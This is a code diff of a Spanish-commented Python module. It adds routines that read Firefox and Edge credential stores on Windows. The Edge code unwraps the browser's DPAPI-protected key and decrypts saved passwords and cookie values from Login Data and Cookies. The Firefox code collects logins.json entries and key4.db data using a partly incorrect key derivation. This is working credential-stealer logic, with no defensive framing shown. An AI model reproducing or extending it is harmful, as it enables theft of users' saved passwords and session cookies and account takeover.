@@ -3,20 +3,22 @@ import json
 import os
 import sqlite3
 import binascii
-
-import pywintypes
 import win32crypt
-from models.cookie import FirefoxCookie, EdgeCookie
+from Crypto.Cipher import AES
+from models.firefox import FirefoxCookie, FirefoxUsuarios
+from models.edge import EdgeCookie, edge_usuario_contrasenia
 from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
 from cryptography.hazmat.backends import default_backend
-
+from Crypto.Hash import SHA256
+from Crypto.Protocol.KDF import PBKDF2
 
 
 class CookieRepository_Firefox:
     def __init__(self):
-        self.firefox_db_path = os.path.join(os.environ["USERPROFILE"], "AppData", "Roaming", "Mozilla", "Firefox",'Profiles', "3xl97urt.default-release", "cookies.sqlite")
-        self.firefox_key_path = os.path.join(os.environ["USERPROFILE"], "AppData", "Roaming", "Mozilla", "Firefox",'Profiles', "3xl97urt.default-release", "key4.db")
-
+        self.firefox_db_path = os.path.join(os.environ["USERPROFILE"], "AppData", "Roaming", "Mozilla", "Firefox",'Profiles', "1knc2i2e.default-release", "cookies.sqlite")
+        self.firefox_key_path = os.path.join(os.environ["USERPROFILE"], "AppData", "Roaming", "Mozilla", "Firefox",'Profiles', "1knc2i2e.default-release", "key4.db")
+        self.firefox_password_db_path = os.path.join(os.environ["USERPROFILE"], "AppData", "Roaming", "Mozilla", "Firefox",
+                                                'Profiles', "1knc2i2e.default-release", "logins.json")
     # Obtner las cookies de firefox
     def get_firefox_cookies(self):
         cookies = []
@@ -41,6 +43,7 @@ class CookieRepository_Firefox:
                 cookies.append(
                     FirefoxCookie(originAttributes, host, name, decrypted_value, path_value, expiry, lastAccessed, isHttpOnly,
                                   isSecure))
+                #cookies = Decryptor(self.firefox_db_path, self.firefox_key_path).decrypt()
 
         return cookies
 
@@ -103,23 +106,75 @@ class CookieRepository_Firefox:
             return encryption_key, IV
         return None, None
 
+    def obtener_contrasenias(self):
+        contrasenias = []
+        #llave = self.obtener_llave_session()
+        with open(self.firefox_password_db_path, 'r') as file:
+            data = json.load(file)
+            for login in data['logins']:
+                origin_url = login['hostname']
+                action_url = login['formSubmitURL']
+                username_value = login['encryptedUsername']
+                password_value = login['encryptedPassword']
+                #username_value =desecriptar_dato(username_value, llave)
+                #password_value = desecriptar_dato(password_value, llave)
+                date_created = login['timeCreated']
+                date_last_used = login['timeLastUsed']
+                if username_value or password_value:
+                    aux = FirefoxUsuarios(origin_url, action_url, username_value, password_value, date_created, date_last_used)
+                else:
+                    continue
+                contrasenias.append(aux)
+        return contrasenias
+
+
+
+    def obtener_llave_session(self):
+        #obterner la llave de session de firefox de la base de datos key4.db
+        conn = sqlite3.connect(self.firefox_key_path)
+        cursor = conn.cursor()
+        cursor.execute('SELECT item1 FROM metaData WHERE id = ? ', ('password',))
+        row = cursor.fetchone()
+        #utilizar PBKDF2 para desencriptar la llave
+        if row:
+            key = row[0].hex()
+            key = base64.b64decode(key)
+            salt = b'saltysalt'
+            iv = b' ' * 16
+            length = 16
+            backend = default_backend()
+            key = PBKDF2(key, salt, length, 100, backend)
+            return key
+
+        return None
+
 
 class CookieRepository_Edge:
     def __init__(self):
-        self.edge_db_path = os.path.join(os.environ["USERPROFILE"], "AppData", "Local",
-                                        "Microsoft", "Edge", "User Data", "Default",'Network', "Cookies")
-        self.directorio_llaves_edge = os.path.join(os.environ["USERPROFILE"], "AppData", "Local",
-                                              "Microsoft", "Edge", "User Data", "Local State")
+        self.edge_db_path = os.path.join(os.environ["USERPROFILE"], "AppData", "Local", "Microsoft", "Edge", "User Data", "Default",'Network', "Cookies")
+        self.edge_db_user_path = os.path.join(os.environ["USERPROFILE"], "AppData", "Local", "Microsoft", "Edge", "User Data",'Default', "Login Data")
+        self.directorio_llaves_edge = os.path.join(os.environ["USERPROFILE"], "AppData", "Local","Microsoft", "Edge", "User Data", "Local State")
     # Obtner las cookies de session de edge
     def get_edge_cookies(self):
         cookies = []
+        llave = self.obtener_llave_session()
         with sqlite3.connect(self.edge_db_path) as conn:
             cursor = conn.cursor()
             cursor.execute(
                 'SELECT creation_utc, host_key, top_frame_site_key, name, value, path, expires_utc, is_secure, is_httponly, last_access_utc, has_expires, is_persistent, priority, samesite, source_port, encrypted_value FROM cookies')
-            for row in cursor.fetchall():
-                cookies.append(EdgeCookie(*row))
+            for creation_utc, host_key, top_frame_site_key, name, value, path, expires_utc, is_secure, is_httponly, last_access_utc, has_expires, is_persistent, priority, samesite, source_port, encrypted_value in cursor.fetchall():
+                try:
+
+                    encrypted_value = desecriptar_dato(encrypted_value, llave)
+
+                    cookies.append(EdgeCookie(creation_utc, host_key, top_frame_site_key, name, value, path, expires_utc,
+                                   is_secure,
+                                   is_httponly, last_access_utc, has_expires, is_persistent, priority, samesite,
+                                   source_port, encrypted_value))
+                except Exception as e:
+                    print(f"Error desencriptando cookie: {e}")
         return cookies
+
 
     # Obtner las cookies de session de edge
     def get_edge_cookies_session(self):
@@ -141,12 +196,47 @@ class CookieRepository_Edge:
             row = cursor.fetchone()
         return row[0] if row else 0
 
+    def obtener_contrasenias(self):
+        llave = self.obtener_llave_session()
+        contrasenias = []
+        with sqlite3.connect(self.edge_db_user_path) as conn:
+            cursor = conn.cursor()
+            cursor.execute(
+                'select origin_url, action_url, username_value, password_value, date_created, date_last_used from logins order by date_created desc')
+            for origin_url, action_url, username_value, password_value, date_created, date_last_used in cursor.fetchall():
+                password = desecriptar_dato(password_value, llave)
+                if username_value or password:
+                    aux = edge_usuario_contrasenia(origin_url, action_url, username_value, password, date_created,
+                                                   date_last_used)
+                else:
+                    continue
+                contrasenias.append(aux)
+        cursor.close()
+        conn.close()
+        return contrasenias
+
     def obtener_llave_session(self):
         # Leer el archivo key
-        with open(self.directorio_llaves_edge, 'r') as file:
-            key = file.read()  # Leer el archivo
+        with open(self.directorio_llaves_edge, 'r', encoding='utf-8') as file:
+            file2 = file.read()  # Leer el archivo
             # Guardar en json el archivo
-            key = json.loads(key)
+            file2 = json.loads(file2)
 
-        return key
+        key = base64.b64decode(file2['os_crypt']['encrypted_key'])  # Decodificar la clave en base64 a bytes
+        key = key[5:]  # Eliminar el prefijo 'DPAPI' si existe
+        return win32crypt.CryptUnprotectData(key, None, None, None, 0)[1]
+
+
+def desecriptar_dato(data ,llave):
+    try:
+        iv = data[3:15]
+        data = data[15:]
+        cifrar = AES.new(llave, AES.MODE_GCM,iv)
+        return cifrar.decrypt(data)[:-16].decode()
+    except Exception:
+        try:
+            return str(win32crypt.CryptUnprotectData(data, None, None, None, 0)[1])
+        except Exception:
+            return ""
+
 
